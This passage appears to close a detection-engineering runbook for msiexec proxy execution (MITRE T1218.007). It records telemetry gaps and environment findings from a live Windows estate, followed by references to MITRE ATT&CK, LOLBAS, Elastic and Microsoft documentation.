- **KB-worthy (persist to NBI customer scope):** (1) no `msiexec.exe` executions on 4688 in-window over 4h (rule is low-volume/rare in this estate); (2) no process-to-network telemetry → MSI download/source not observable on-cluster; (3) command-line host-bimodality; (4) `process.hash.*` absent on 4688; (5) `10.11.102.15` = shared VDI/admin egress fronting `nim-jump-apv02`. Observed live 2026-08-19.

## 24. References

- MITRE ATT&CK — System Binary Proxy Execution: Msiexec (T1218.007): https://attack.mitre.org/techniques/T1218/007/
- MITRE ATT&CK — Ingress Tool Transfer (T1105): https://attack.mitre.org/techniques/T1105/
- MITRE ATT&CK — Defense Evasion tactic (TA0005): https://attack.mitre.org/tactics/TA0005/
- LOLBAS — Msiexec.exe: https://lolbas-project.github.io/lolbas/Binaries/Msiexec/
- Elastic — Prebuilt rule "Msiexec Network Connection" / remote-install proxy execution reference: https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/defense_evasion_msiexec_network_connection
- Microsoft Learn — Msiexec.exe command-line options: https://learn.microsoft.com/en-us/windows/win32/msi/command-line-options
- Microsoft Learn — Command line process auditing (Event 4688 command-line GPO): https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing
